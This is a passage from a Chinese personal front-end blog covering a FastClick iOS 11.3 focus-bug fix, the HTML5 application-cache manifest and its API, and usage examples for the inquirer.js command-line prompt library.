+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">FastClick.prototype.focus &#x3D; function(targetElement) &#123;</span><br><span class="line">    var length;</span><br><span class="line"></span><br><span class="line">    if (deviceIsIOS &amp;&amp; targetElement.setSelectionRange &amp;&amp; targetElement.type.indexOf(&#39;date&#39;) !&#x3D;&#x3D; 0 &amp;&amp; targetElement.type !&#x3D;&#x3D; &#39;time&#39; &amp;&amp; targetElement.type !&#x3D;&#x3D; &#39;month&#39; &amp;&amp; targetElement.type !&#x3D;&#x3D; &#39;email&#39;) &#123;</span><br><span class="line">        &#x2F;&#x2F; 通过 targetElement.setSelectionRange(length, length) 将光标的位置定位在内容的尾部（但注意，这时候还没触发focus事件）</span><br><span class="line">        length &#x3D; targetElement.value.length;</span><br><span class="line">        targetElement.setSelectionRange(length, length);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        targetElement.focus();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>模拟的click事件，本质就是用代码创建一个Event作为点击事件触发，关键代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FastClick.prototype.sendClick &#x3D; function(targetElement, event) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x2F;&#x2F; Synthesise a click event, with an extra attribute so it can be tracked</span><br><span class="line">    clickEvent &#x3D; document.createEvent(&#39;MouseEvents&#39;);</span><br><span class="line">    clickEvent.initMouseEvent(this.determineEventType(targetElement), true, true, window, 1, touch.screenX, touch.screenY, touch.clientX, touch.clientY, false, false, false, false, 0, null);</span><br><span class="line">    clickEvent.forwardedTouchEvent &#x3D; true;</span><br><span class="line">    targetElement.dispatchEvent(clickEvent);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>最后，fastclick使用了preventDefault和stopImmediatePropagation拦截原生的click响应函数。preventDefault函数很常见了，但stopImmediatePropagation真是头一次见它。根据规范可知，该方法不仅可以阻止冒泡，还能将元素绑定的后序相同类型事件的监听函数的执行也一起阻止了，也就是说如果在点击事件中调用了它，可以阻止点击事件冒泡传递到父级元素，同时又能阻止该元素上的其他点击响应函数。</p>
+<h2 id="最后，如何修复？"><a href="#最后，如何修复？" class="headerlink" title="最后，如何修复？"></a>最后，如何修复？</h2><p>Issues中给出的修复方法是强制元素focus，即在改写的focus响应函数中直接触发元素的focus事件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FastClick.prototype.focus &#x3D; function(targetElement) &#123;</span><br><span class="line">    targetElement.focus();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>推测原因是由于ios11.3取消了input元素setSelectionRange自动聚焦的功能（非此原因 (⊙﹏⊙)）</p>
+<blockquote>
+<p>(6.22更新) 对比了一下ios11.3与之前的fastclick相关运行过程，只有320行左右有区别，“document.activeElement.blur();”，ios11.3之后在第二次点击时有经过，而ios11.3之前的没有。另外，350行左右的“targetElement.setSelectionRange(length, length);”，是引起输入框聚焦的原因，但仅仅执行这个函数还无法到达聚焦的效果，fastclick还做了哪些相关工作，仍未知。</p>
+</blockquote>
+<p>此外，ios11.3支持了Web API：允许对事件支持被动模式，减少滚动屏幕的性能损耗和奔溃，并且针对document的touch事件监听添加被动模式的配置，因此document将不再调用preventDefault方法。这些改动会引起fastclick的另一个bug，当静置app或锁屏几秒后页面将无法响应任何点击操作。<br>解决方法也很简单，只需去除被动模式，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 支持设置passive的，将被动模式显式设置为false</span><br><span class="line">layer.addEventListener(&#39;touchstart&#39;, this.onTouchStart, &#123;passive:false&#125;);</span><br><span class="line">&#x2F;&#x2F; 否则，去除默认的被动模式</span><br><span class="line">layer.addEventListener(&#39;touchstart&#39;, this.onTouchStart, false);</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/html5%E7%9A%84%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8%E9%97%AE%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/html5%E7%9A%84%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">html5的离线存储问题</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 13:14:04" itemprop="dateModified" datetime="2021-03-10T13:14:04+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>HTML5的一个重要特性就是离线存储，所谓的离线存储就是将一些资源文件保存在本地，这样后续的页面重新加载将使用本地资源文件，在离线情况下可以继续访问web应用，同时通过一定的手法（更新相关文件或者使用相关API），可以更新、删除离线存储等操作；</p>
+<p>HTML5的离线存储使用一个manifest文件来标明哪些文件是需要被存储的，使用如 <html manifest="offline.manifest"> 来引入一个manifest文件，这个文件的路径可以是相对的，也可以是绝对的，如果你的web应用很多，而且希望能集中管理manifest文件，那么静态文件服务器是个不错的选择。</p>
+<p>对于manifest文件，要求：文件的mime-type必须是 text/cache-manifest类型。如果你是JAVA工程，在你的web.xml中配置请求后缀为manifest的格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;mime-mapping&gt;</span><br><span class="line">&lt;extension&gt;manifest&lt;&#x2F;extension&gt;</span><br><span class="line">&lt;mime-type&gt;text&#x2F;cache-manifest&lt;&#x2F;mime-type&gt;</span><br><span class="line">&lt;&#x2F;mime-mapping&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>这样可以控制请求到的manifest文件格式为text/cache-manifest的。</p>
+<h3 id="manifest文件的格式："><a href="#manifest文件的格式：" class="headerlink" title="manifest文件的格式："></a>manifest文件的格式：</h3><blockquote>
+<p>CACHE MANIFEST# 这一句必须存在，而且必须放在头部# 指明缓存入口CACHE:index.htmlstyle.cssimages/logo.pngscripts/main.js# 以下资源必须在线访问NETWORK:login.php# 如果index.php无法访问则用404.html代替FALLBACK:/index.php /404.html</p>
+</blockquote>
+<p>其中 CACHE 不是必须存在的，可以直接在 CACHE MANIFEST 行之下直接写需要缓存的文件，在这里指明的文件将被缓存到浏览器本地。在NETWORK之下指明的文件，是强制必须通过网络资源获取的，在FALLBACK下指明的是一种失败的回调方案，比如上述index.php无法访问，那么就发出404.htm请求</p>
+<p>这样几步就可以完成对离线存储的支持。接下来要思考的，是如何更新离线存储？</p>
+<p>当用户本地再次联网的时候，本地的离线存储资源需要检查是否需要更新，这个更新过程，也是通过manifest的更新来控制的，更新了manifest文件，浏览器会自动的重新下载新的manifest文件并在下一次刷新页面的时候进行资源文件的重新请求（第三次刷新替换本地缓存为最新缓存），而且这个请求是全局性的，也就是所有在manifest缓存列表中的文件都会被请求一次，而不是单独请求某个特定修改过的资源文件，因为manifest是不知道哪个文件被修改过了的。</p>
+<p>对于全局更新的担心是不必要的，因为对于没有更新过的资源文件，请求依旧是304响应，只有真正更新过的资源文件才是200.</p>
+<p>所以控制离线存储的更新，需要2个步骤，一是更新资源文件，二是更新manifest文件，特别的，更新manifest文件是不需要修改什么特定内容的，只要是这个文件随意一处被修改，那么浏览器就会感知，对于我们的资源文件通常名称是固定的，比如**.css，更新内容不会带有文件名更新的情况下，需要更新manifest文件怎么操作呢？一个比较好的方式是更新任意一处# 开头的注释即可，其目的只是告诉浏览器这个manifest文件被更新过。</p>
+<p>以上的这些内容，其更新操作都是浏览器自动完成的。同样的，W3C定义了<a target="_blank" rel="noopener" href="http://www.whatwg.org/specs/web-apps/current-work/#applicationcache">离线存储的API规范</a></p>
+<h3 id="API："><a href="#API：" class="headerlink" title="API："></a>API：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &#x2F;&#x2F; 更新，一般来说更新下载是通过用户**（如浏览器）自动完成的，但是这个方法适用于一些长期打开的页面，比如邮件系统，可能这个页面是长期打开的，而不会有刷新动作，所以这个就比较适合做自动更新下</span><br><span class="line">void update();</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F; 取消</span><br><span class="line"> void abort();</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F; 替换缓存内容 ，对于manifest文件的改变，通常是下一次的刷新才会触发下载更新，第三次刷新才会切换使用新的缓存文件，通过这个方法，可以强制将缓存替换</span><br><span class="line"> void swapCache();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>提供了如下的事件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Event handler             Event handler event type</span><br><span class="line">onchecking             checking</span><br><span class="line">onerror                     error</span><br><span class="line">onnoupdate             noupdate</span><br><span class="line">ondownloading             downloading</span><br><span class="line">onprogress             progress</span><br><span class="line">onupdateready             updateready</span><br><span class="line">oncached                     cached</span><br><span class="line">onobsolete             obsolete</span><br></pre></td></tr></table></figure>
+
+<p>最后说一个对于manifest比较特别的地方：对于某个文件a.htm，其中有 <html manifest='a.manifest'> ，那么离线存储中，会自动将a.htm加入到列表中，这意味着a.htm的再次刷新将从本地缓存中获取，这样的机制从官方得到的答复是“特别的设计”，而对我们来说，这种强加的特性在后续的开发过程中会有不少问题。</p>
+<p>比如：</p>
+<p>       1、如何计算PV UV，由于当前页面被强制加入manifest，那么PV 和UV的统计，成了一个难题，因为请求不再是发送到服务器；</p>
+<p>       2、对于某个使用manifest的文件，其带有的参数可能是随机性的统计参数，如sid=123sss, sid=234fff ，尤其是比如商品详情的id字段等，这样每个页面都自动加入到manifest中，将会带来很大的存储开销，而且是毫无意义的；</p>
+<p>       所以伴随而来的，是如何在现有的体系架构下进行数据统计的难题，一个常规的方案是进入离线存储页面后自动发出ajax请求，以告知服务器统计PV UV；</p>
+<p>       对于第二个问题，可能就比较棘手，但是将GET请求的方式改成POST的方式确实是个解决问题的方案。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/inquirer-js-%E2%80%94%E2%80%94-%E7%94%A8%E6%88%B7%E4%B8%8E%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BA%A4%E4%BA%92%E7%9A%84%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/inquirer-js-%E2%80%94%E2%80%94-%E7%94%A8%E6%88%B7%E4%B8%8E%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BA%A4%E4%BA%92%E7%9A%84%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">inquirer-js-——-用户与命令行交互的工具</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 13:14:04" itemprop="dateModified" datetime="2021-03-10T13:14:04+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><code>Inquirerjs </code>是一个用来实现命令行交互式界面的工具集合。它帮助我们实现与用户的交互式交流，比如给用户提一个问题，用户给我们一个答案，我们根据用户的答案来做一些事情<br>由于交互的问题种类不同，inquirer为每个问题提供很多参数：</p>
+<ul>
+<li>type：表示提问的类型，包括：input, confirm, list, rawlist, expand, checkbox, password, editor；</li>
+<li>name: 存储当前问题回答的变量；</li>
+<li>message：问题的描述；</li>
+<li>default：默认值；</li>
+<li>choices：列表选项，在某些type下可用，并且包含一个分隔符(separator)；</li>
+<li>validate：对用户的回答进行校验；</li>
+<li>filter：对用户的回答进行过滤处理，返回处理后的值；</li>
+<li>transformer：对用户回答的显示效果进行处理(如：修改回答的字体或背景颜色)，但不会影响最终的答案的内容；</li>
+<li>when：根据前面问题的回答，判断当前问题是否需要被回答；</li>
+<li>pageSize：修改某些type类型下的渲染行数；</li>
+<li>prefix：修改message默认前缀；</li>
+<li>suffix：修改message默认后缀。<h3 id="一-使用"><a href="#一-使用" class="headerlink" title="一. 使用"></a>一. 使用</h3></li>
+</ul>
+<h4 id="0-语法结构"><a href="#0-语法结构" class="headerlink" title="0. 语法结构"></a>0. 语法结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const inquirer &#x3D; require(&#39;inquirer&#39;);</span><br><span class="line"></span><br><span class="line">const promptList &#x3D; [</span><br><span class="line">    &#x2F;&#x2F; 具体交互内容</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">inquirer.prompt(promptList).then(answers &#x3D;&gt; &#123;</span><br><span class="line">    console.log(answers); &#x2F;&#x2F; 返回的结果</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-input"><a href="#1-input" class="headerlink" title="1. input"></a>1. input</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &#39;input&#39;,</span><br><span class="line">    message: &#39;设置一个用户名:&#39;,</span><br><span class="line">    name: &#39;name&#39;,</span><br><span class="line">    default: &quot;test_user&quot; &#x2F;&#x2F; 默认值</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    type: &#39;input&#39;,</span><br><span class="line">    message: &#39;请输入手机号:&#39;,</span><br><span class="line">    name: &#39;phone&#39;,</span><br><span class="line">    validate: function(val) &#123;</span><br><span class="line">        if(val.match(&#x2F;\d&#123;11&#125;&#x2F;g)) &#123; &#x2F;&#x2F; 校验位数</span><br><span class="line">            return val;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;请输入11位数字&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
+
+<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-a61db2cc44656c1a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="input"></p>
+<h4 id="2-confirm"><a href="#2-confirm" class="headerlink" title="2. confirm"></a>2. confirm</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;confirm&quot;,</span><br><span class="line">    message: &quot;是否使用监听？&quot;,</span><br><span class="line">    name: &quot;watch&quot;,</span><br><span class="line">    prefix: &quot;前缀&quot;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    type: &quot;confirm&quot;,</span><br><span class="line">    message: &quot;是否进行文件过滤？&quot;,</span><br><span class="line">    name: &quot;filter&quot;,</span><br><span class="line">    suffix: &quot;后缀&quot;,</span><br><span class="line">    when: function(answers) &#123; &#x2F;&#x2F; 当watch为true的时候才会提问当前问题</span><br><span class="line">        return answers.watch</span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
+
+<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-2cdda6a4350f38d7?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="confirm_y"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-90ec32a80e5c45fd?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="confirm_n"></p>
+<h4 id="3-list"><a href="#3-list" class="headerlink" title="3. list"></a>3. list</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &#39;list&#39;,</span><br><span class="line">    message: &#39;请选择一种水果:&#39;,</span><br><span class="line">    name: &#39;fruit&#39;,</span><br><span class="line">    choices: [</span><br><span class="line">        &quot;Apple&quot;,</span><br><span class="line">        &quot;Pear&quot;,</span><br><span class="line">        &quot;Banana&quot;</span><br><span class="line">    ],</span><br><span class="line">    filter: function (val) &#123; &#x2F;&#x2F; 使用filter将回答变为小写</span><br><span class="line">        return val.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
+
+<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-dfa4dc6a673edce2?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="list_1"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-59be0f369c690cd1?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="list"></p>
+<h4 id="4-rawlist"><a href="#4-rawlist" class="headerlink" title="4. rawlist"></a>4. rawlist</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &#39;rawlist&#39;,</span><br><span class="line">    message: &#39;请选择一种水果:&#39;,</span><br><span class="line">    name: &#39;fruit&#39;,</span><br><span class="line">    choices: [</span><br><span class="line">        &quot;Apple&quot;,</span><br><span class="line">        &quot;Pear&quot;,</span><br><span class="line">        &quot;Banana&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
+
+<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-5a43083f7a9bac09?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="rawlist"></p>
+<h4 id="5-expand"><a href="#5-expand" class="headerlink" title="5. expand"></a>5. expand</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;expand&quot;,</span><br><span class="line">    message: &quot;请选择一种水果：&quot;,</span><br><span class="line">    name: &quot;fruit&quot;,</span><br><span class="line">    choices: [</span><br><span class="line">        &#123;</span><br><span class="line">            key: &quot;a&quot;,</span><br><span class="line">            name: &quot;Apple&quot;,</span><br><span class="line">            value: &quot;apple&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            key: &quot;O&quot;,</span><br><span class="line">            name: &quot;Orange&quot;,</span><br><span class="line">            value: &quot;orange&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            key: &quot;p&quot;,</span><br><span class="line">            name: &quot;Pear&quot;,</span><br><span class="line">            value: &quot;pear&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
+
+<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-4399710481c3226c?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="expend_1"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8abcbd27a8c47233?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="expend_2"></p>
+<h4 id="6-checkbox"><a href="#6-checkbox" class="headerlink" title="6. checkbox"></a>6. checkbox</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;checkbox&quot;,</span><br><span class="line">    message: &quot;选择颜色:&quot;,</span><br><span class="line">    name: &quot;color&quot;,</span><br><span class="line">    choices: [</span><br><span class="line">        &#123;</span><br><span class="line">            name: &quot;red&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        new inquirer.Separator(), &#x2F;&#x2F; 添加分隔符</span><br><span class="line">        &#123;</span><br><span class="line">            name: &quot;blur&quot;,</span><br><span class="line">            checked: true &#x2F;&#x2F; 默认选中</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            name: &quot;green&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        new inquirer.Separator(&quot;--- 分隔符 ---&quot;), &#x2F;&#x2F; 自定义分隔符</span><br><span class="line">        &#123;</span><br><span class="line">            name: &quot;yellow&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;];</span><br><span class="line">&#x2F;&#x2F; 或者下面这样</span><br><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;checkbox&quot;,</span><br><span class="line">    message: &quot;选择颜色:&quot;,</span><br><span class="line">    name: &quot;color&quot;,</span><br><span class="line">    choices: [</span><br><span class="line">        &quot;red&quot;,</span><br><span class="line">        &quot;blur&quot;,</span><br><span class="line">        &quot;green&quot;,</span><br><span class="line">        &quot;yellow&quot;</span><br><span class="line">    ],</span><br><span class="line">    pageSize: 2 &#x2F;&#x2F; 设置行数</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
+
+<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-c96229da119c592d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checkbox_sep"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9baf91e05a3e5dc1?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checkbox_size"></p>
+<h4 id="7-password"><a href="#7-password" class="headerlink" title="7. password"></a>7. password</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;password&quot;, &#x2F;&#x2F; 密码为密文输入</span><br><span class="line">    message: &quot;请输入密码：&quot;,</span><br><span class="line">    name: &quot;pwd&quot;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
+
+<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-8e3e714bf4be5ccb?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="pwd"></p>
